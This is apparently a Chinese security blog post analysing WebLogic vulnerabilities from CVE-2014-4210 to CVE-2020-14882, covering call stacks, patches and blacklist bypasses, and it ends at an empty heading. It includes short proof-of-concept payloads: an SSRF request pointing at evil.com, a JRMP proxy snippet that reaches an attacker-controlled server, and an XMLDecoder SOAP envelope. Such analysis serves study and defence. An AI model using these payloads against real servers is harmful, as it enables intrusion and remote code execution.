---
title: "WebLogic漏洞总结"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:39:10+08:00
tags: ["java"]
draft: false
---

## CVE-2014-4210 {#cve-2014-4210}


### 影响范围 {#影响范围}

Oracle WebLogic Server 10.0.2.0
Oracle WebLogic Server 10.3.6.0


### 漏洞原理 {#漏洞原理}

SSRF 漏洞，输入点在 /uddiexplorer/SearchPublicRegistries.jsp 页面的 operator 参
数中

{{< figure src="/ox-hugo/2021-11-09_15-59-57_screenshot.png" >}}

看一下 SearchPublicRegistries.jsp 对该参数的处理：

{{< figure src="/ox-hugo/2021-11-09_16-05-18_screenshot.png" >}}

从请求中拿到 operator 没做什么处理便传入 search 对象，然后调用了它的 getResponse
方法，那么跟进一下 search 对象的类 com.bea.uddiexplorer.Search

首先是 setOperator 方法：

```java
public void setOperator(String var1) {
    try {
        this.m_operator = var1;
        this.setUDDIInquiryURL(var1);
    } catch (Exception var4) {
        String var3 = (new UDDITextFormatter()).uddiExplorerSearchOpException();
        this.log.error(var3, var4);
    }
}
public void setUDDIInquiryURL(String var1) {
    this.UDDI_INQUIRY_URL = var1;
    this.m_inquiry.setURL(this.UDDI_INQUIRY_URL);
}
```

用我们控制的 operator 参数值设置了 m_operator 和 m_inquiry 属性

然后跟进 getResponse 方法：

```java
public Object getResponse(String var1, String var2, String var3, String var4, String var5) throws UDDIException, XML_SoapException {
    Object var6 = null;
    if (var1.equalsIgnoreCase("name")) {
        var6 = this.findBusinessListByName(var2);
    } else if (var1.equalsIgnoreCase("key")) {
        ...}
    ...}
private BusinessList findBusinessListByName(String var1) throws UDDIException, XML_SoapException {
    BusinessList var2 = null;
    FindBusiness var3 = new FindBusiness();
    var3.setName(new Name(var1));
    var2 = this.m_inquiry.findBusiness(var3);
    return var2;
}
```

当 var1 的值是 name 时，则会调用 m_inquiry 属性的 findBusiness 方法，var1 我们可
以通过传入 rdoSearch 来控制，var2 我们也需要通过 txtSearchname 参数来设置一个值

跟进 findBusiness 方法：

{{< figure src="/ox-hugo/2021-11-09_16-35-39_screenshot.png" >}}

此时 sendMessage 的参数已经被污染了，在这个方法中会使用 BindingFactory#create 方
法构建一个 Binding 实例用来发送请求，而 create 方法的参数受到 sendMessage 的参数
影响。关键代码如下：

{{< figure src="/ox-hugo/2021-11-09_16-40-15_screenshot.png" >}}

构建 Binding 实例的过程：

```nil
setBindingInfo:63, AbstractBinding (weblogic.webservice.binding)
init:118, Http11ClientBinding (weblogic.webservice.binding.http11)
create:50, BindingFactory (weblogic.webservice.binding)
sendMessage:78, UDDISoapMessage (weblogic.uddi.client.service)
findBusiness:101, Inquiry (weblogic.uddi.client.service)
findBusinessListByName:325, Search (com.bea.uddiexplorer)
getResponse:172, Search (com.bea.uddiexplorer)
...
```

这时 Binding 的 url 属性已经被我们控制，继续执行 UDDISoapMessage#sendMessage 触发
ssrf 请求：

```nil
openConnection:33, Handler (weblogic.net.http)
openConnection:971, URL (java.net)
send:384, Http11ClientBinding (weblogic.webservice.binding.http11)
sendMessage:80, UDDISoapMessage (weblogic.uddi.client.service)
...
```

{{< figure src="/ox-hugo/2021-11-09_16-45-36_screenshot.png" >}}

poc：

```text
http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&btnSubmit=Search&operator=http://evil.com
```


## CVE-2015-4852 {#cve-2015-4852}


### 影响范围 {#影响范围}

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.2.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.0


### 漏洞原理 {#漏洞原理}

T3 协议解析从 MsgAbbrevInputStream#init 方法开始

解析协议头

```text
this.header.readHeader()
```

记录 abbrevOffset 并跳过偏移然后调用 readMsgAbbrevs，后面会调用 ObjectInputStream
的 readObject 方法对输入流进行反序列化：

```nil
readObject:62, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
...
```

这一段应该是 T3 协议解析的常规过程，也是反序列化过程的入口，黑名单检查会在后面的地
方进行。

在 readObject 流程中会调用 resolveClass 方法来获取目标对象的 class，这个方法也是
后面补丁黑名单检查的地方：

```nil
resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
readNonProxyDesc:1610, ObjectInputStream (java.io)
readClassDesc:1515, ObjectInputStream (java.io)
readOrdinaryObject:1769, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
...
```

{{< figure src="/ox-hugo/2021-08-30_22-17-26_screenshot.png" >}}

InboundMsgAbbrev#read 方法：

```java
int var3 = var1.readLength();

for(int var4 = 0; var4 < var3; ++var4) {
    int var5 = var1.readLength();
    Object var6;
    if (var5 > var2.getCapacity()) {
        var6 = this.readObject(var1);
        var2.getAbbrev(var6);
        this.abbrevs.push(var6);
    } else {
        var6 = var2.getValue(var5);
        this.abbrevs.push(var6);
    }
}
```

当前 Abbrev 数据块长度大于 capacity(AS 头)时才会反序列化对象


## CVE-2016-0638 {#cve-2016-0638}


### 影响范围 {#影响范围}

Oracle WebLogic Server 10.3.6
Oracle WebLogic Server 12.1.2
Oracle WebLogic Server 12.1.3
Oracle WebLogic Server 12.2.1


### 漏洞原理 {#漏洞原理}

需要打补丁：p20780171_1036_Generic 和 p22248372_1036012_Generic，或者它们的集合补
丁 p21984589_1036_Generic

添加了一个 ClassFilter 类实现黑名单功能，作用在以下类的反序列化过程中：

```nil
weblogic.rjvm.InboundMsgAbbrev.class$ServerChannelInputStream
weblogic.rjvm.MsgAbbrevInputStream.class
weblogic.iiop.Utils.class
```

绕过思路：找到一个类，它可以封装我们的恶意对象，并在反序列化时（比如 readObject）
创建一个序列化流来反序列化恶意对象，但是又不能使用上面被检查的
ServerChannelInputStream 和 MsgAbbrevInputStream

最后找到可以利用的类是 weblogic.jms.common.StreamMessageImpl，利用点在它的
readExternal 方法中

{{< figure src="/ox-hugo/2021-11-14_22-20-36_screenshot.png" >}}

可见通过 StreamMessageImpl 来包装恶意对象，在执行 readExternal 时会新建一个
ObjectInputStream 来反序列化我们的恶意对象，所以不会经过 weblogic 的过滤


## CVE-2016-3510 {#cve-2016-3510}

为了绕过黑名单（ClassFilter？），利用 MarshalledObject 这个没有被加黑的类来反序列
化恶意对象。

当 T3 协议传输一个 MarshalledObject 序列化对象时，在解析过程会进入到它的
readResolve 方法：

```nil
readResolve:57, MarshalledObject (weblogic.corba.utils)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invokeReadResolve:1091, ObjectStreamClass (java.io) <-- 通过反射调用反序列化对象的 readResolve
readOrdinaryObject:1805, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
...
```

{{< figure src="/ox-hugo/2021-08-31_11-34-55_screenshot.png" >}}

这里会将 `this.objBytes` 包装到序列化的输入流中再调用 readObject，观察一下
MarshalledObject 的构造函数就会发现，只要将恶意类作为参数传入，就会将它序列化后
保存到 objBytes 属性中

{{< figure src="/ox-hugo/2021-08-31_11-38-50_screenshot.png" >}}


## CVE-2017-3506 {#cve-2017-3506}


### 影响范围 {#影响范围}

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.0
Oracle WebLogic Server 12.2.1.1
Oracle WebLogic Server 12.2.1.2


### 漏洞原理 {#漏洞原理}

使用 XMLDecoder 解析 [SOAP]({{< relref "soap.md" >}}) 请求内容时，对请求中的 Java object 进行了反序列化操作，
导致漏洞。

调用栈：

```nil
readObject:250, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
...
```

补丁，添加 WorkContextXmlInputAdapter#validate 方法，禁用 object 标签：

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

在 CVE-2017-10271 使用 void 代替 object 标签绕过过滤


## CVE-2017-3248 {#cve-2017-3248}


### 影响范围 {#影响范围}

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.0
Oracle WebLogic Server 12.2.1.1


### 漏洞原理 {#漏洞原理}

需要一个恶意 JRMP 服务端，通过 T3 协议让 WebLogic 向我们控制的 JRMPListener
发送请求，然后反序列化我们返回的恶意对象。

{{< figure src="/ox-hugo/2021-08-31_15-55-58_screenshot.png" >}}

攻击者序列化一个 Registry 的动态代理对象，它的 handler 是
RebjectInvocationHandler 并在反序列化时(RemoteObject#readObject)通过 UncastRef 访
问远程恶意服务器来获取 RMI 注册中心。

POC：

```java
  ObjID id = new ObjID(new Random().nextInt()); // RMI registry
  TCoint te = new TCPEndpoint(host, port);
  UnRef ref = new UnicastRef(new LiveRef(id, te, false));
  RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
  Registry proxy = (Registry) Proxy.newProxyInstance(
      BypassPayloadSelector.class.getClassLoader(),
      new Class[]{Registry.class},
      obj);
  return proxy;
```

因为是动态代理类，反序列化时调用的是 ObjectInputStream#readProxyDesc 而不是之前
的 ObjectInputStream#readNonProxyDesc，不会被过滤


## CVE-2018-2628 {#cve-2018-2628}

针对 CVE-2017-3248 添加了个 InboundMsgAbbrev#resolveProxyClass 方法，过滤了
Registry

绕过方法是不使用 Registry 而使用其他 RMI 接口，比如使用 Activator：[CVE-2018-2628
简单复现与分析](http://xxlegend.com/2018/06/20/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)


## CVE-2018-2893 {#cve-2018-2893}

在反序列化利用链的时候过滤了 UnicastRef 和 CommonsCollection，因为 UnicastRef 不
是在利行的过程反序列化的，所以 2018-2628 的 payload 还能用，不过恶意
JRMPListener 要用 jdk7u21 利用链


## CVE-2018-2894 {#cve-2018-2894}


### 影响范围 {#影响范围}

Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.2
Oracle WebLogic Server 12.2.1.3


### 漏洞原理 {#漏洞原理}

文件上传漏洞，受影响路径：

-   tc/begin.do
-   tc/config.do


## CVE-2019-2725 {#cve-2019-2725}

漏洞位于 wls9-async 组件，在反序列化 [SOAP]({{< relref "soap.md" >}}) 的请求内容时触发反序列化漏洞

通过以下路径查看组件是否启动：

```text
01/_async/AsyncResponseService
```

通用无回显 poc：

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="POC">
<array class="xx" length="0">
</array>
<void method="start"/>
</void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>
```

特定版本的回显 poc：<https://github.com/lufeirider/CVE-2019-2725>


## CVE-2019-2729 {#cve-2019-2729}

对 CVE-2019-2725 的绕过，要求版本低于 jdk1.7

> weblogic 10.3.6.0 自带的 jdk 版本为 1.6，jdk1.6 中解析 xml 时有很大的不同，相关处理方法
> 在 com.sun.beans.ObjectHandler
>
> 解析时首先进入的是 startElement 方法
>
> 该方法首先获取元素的属性并创建一个 hashmap，当元素含有属性时，会根据属性值进行类/
> 属性/方法的相关操作，当元素没有属性时，调用的是 new 方法，例如解析&lt;java&gt;、&lt;void&gt;时。
> 而此时如果传入了 method 值就会把方法名设置为该值。

<https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>


## CVE-2019-2890 {#cve-2019-2890}

参考：<https://paper.seebug.org/1069/>

其原理就是找一个黑名单中没过滤干净的类，这个漏洞使用的是 PersistentContext，它的
readObject 方法中调用了自身的 readSubject 方法，代码如下：

{{< figure src="/ox-hugo/2021-09-07_16-42-05_screenshot.png" >}}

可以看到它新建了一个 ObjectInputStream 对象来进行反序列化，因此绕过了之前的黑名
单检测，构造 payload 需要用 PersistentContext#writeSubject 方法来序列化恶意对象，确
保它能成功在 readSubject 中进行反序列化。

在 writeSubject/readSubject 过程中进行了加解密，所以构造 payload 时需要目标服务器
的 SerializedSystemIni.dat 文件（密钥）进行加密，否则反序列化会报错。这里也就是
这个漏洞需要身份认证的原因。

另外要注意三点：

1.  设置 System.setProperty("com.bea.core.internal.client","true")
    否则 SubjectManager#getSubjectManager 方法会死循环

2.  注释以下代码：
    ```java
    if (SecurityServiceManager.isKernelIdentity(var6)) {
        throw new IllegalStateException("Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal");
    } else {
        this._subject = var6;
        this.initTransients();
    }
    ```
    否则抛出 NotSupportedException

3.  在构造函数加上：this._lock = new ReentrantReadWriteLock(false) (不确定)

poc: <https://github.com/SukaraLin/CVE-2019-2890>

修复方法依旧是在 resolveClass 增加检测逻辑：

{{< figure src="/ox-hugo/2021-09-07_16-50-20_screenshot.png" >}}


## CVE-2020-2551 {#cve-2020-2551}

主要原因是过滤 JtaTransactionManager 类时的实现有问题，JtaTransactionManager 父
类 AbstractPlatformTransactionManager 在之前的补丁就加入到黑名单了，[T3 协议]({{< relref "t3_protocol.md" >}})使用
的是 resolveClass 方法去过滤的，resolveClass 方法是会读取父类的，所以 T3 协议这
样过滤是没问题的。但是 [IIOP]({{< relref "iiop.md" >}}) 协议这块，虽然也是使用的这个黑名单列表，但不是使用
resolveClass 方法去判断的，这样默认只会判断本类的类名，而 JtaTransactionManager
类是不在黑名单列表里面的，它的父类才在黑名单列表里面，这样就可以反序列化
JtaTransactionManager 类了，而 JtaTransactionManager 类是存在 [JNDI]({{< relref "jndi.md" >}}) 注入的


## CVE-2020-14756 {#cve-2020-14756}

在 coherence.jar 中有一个 ExternalizableLite 接口

```java
public interface ExternalizableLite extends Serializable {
    void readExternal(DataInput var1) throws IOException;

    void writeExternal(DataOutput var1) throws IOException;
}
```

该接口的实现类可以在一定条件下，通过 ExternalizableHelper#readExternalizableLite
方法进行反序列化，而条件是可控的

{{< figure src="/ox-hugo/2021-11-26_19-44-48_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-11-26_19-46-05_screenshot.png" >}}

使用 readExternalizableLite 方法反序列化时，class 对象是通过 class.forName 获取
的，而不需要经过 resolveClass, 因此绕过了 weblogic 的黑名单检查。然后执行反序列
化对象的 readExternal 方法

```java
public static ExternalizableLite readExternalizableLite(DataInput in, ClassLoader loader) throws IOException {
    ExternalizableLite value;
    if (in instanceof PofInputStream) {
        value = (ExternalizableLite)((PofInputStream)in).readObject();
    } else {
        ...
            value = (ExternalizableLite)loadClass(sClass, loader, fInputWrapper ? ((WrapperDataInputStream)in).getClassLoader() : null).newInstance();
        ...
        value.readExternal((DataInput)in);
    }
    return value;
}

public static Class loadClass(String sClass, ClassLoader loader1, ClassLoader loader2) throws ClassNotFoundException {
    ...
    return Class.forName(sClass);
}
```

其中一个可以利用的类是 com.tangosol.util.aggregator.TopNAggregator.PartialResult,
通过它的 readExternal 可以进入到 MvelExtractor#extract, 不过 PartialResult 的不是
标准的 readExternal 方法，不会自动执行，还需要用 AttributeHolder 封装一下

注意，利用链在 12.1.3 版本存在问题，因为该版本的 JarLoader 只加载了 coherence.jar
和 coherence-web.jar, 而 MvelExtractor 在 coherence-rest.jar 里


## CVE-2020-14882 {#cve-2020-14882}

认证绕过漏洞，通过目录穿越越权访问 console.portal 控制台页面。

路由鉴权的关键流程：

1.  WebAppServletContext#doSecuredExecute
2.  WebAppSecurity#checkAccess
3.  WebAppSecurityWLS#getConstraint
    constraintsMap 属性保存这一个路由列表，通过对比请求路径得到相应的值，返回
    ResourceConstraint 对象

    {{< figure src="/ox-hugo/2021-09-08_18-58-10_screenshot.png" >}}

4.  SecurityModule#isAuthoriaed
    判断是否有权限访问，这里会用到刚刚对象的 unrestricted 属性，由于 css 路径是资源
    路径，给予了访问权限。

第一次 URL 解码在 HttpRequestParser#decodeURI 方法中，将原 URI 解码并处理相对路径，
然后赋值给 normalizedURI 属性；第二次解码在初始化 UIContext 过程时调用的 gettree
方法中。

通过路由鉴权后，后续是通过对应的 servlet 渲染 console.portal 页面。


### <span class="org-todo todo TODO">TODO</span> Netuix 框架执行流程 {#netuix-框架执行流程}

Netuix 是一个通过 XML 文件渲染应用程序的框架（[官方文档](https://docs.oracle.com/cd/E13218_01/wlp/docs81/whitepapers/netix/body.html)）

<https://paper.seebug.org/1411/#223-netuix>


## CVE-2020-14883 {#cve-2020-14883}
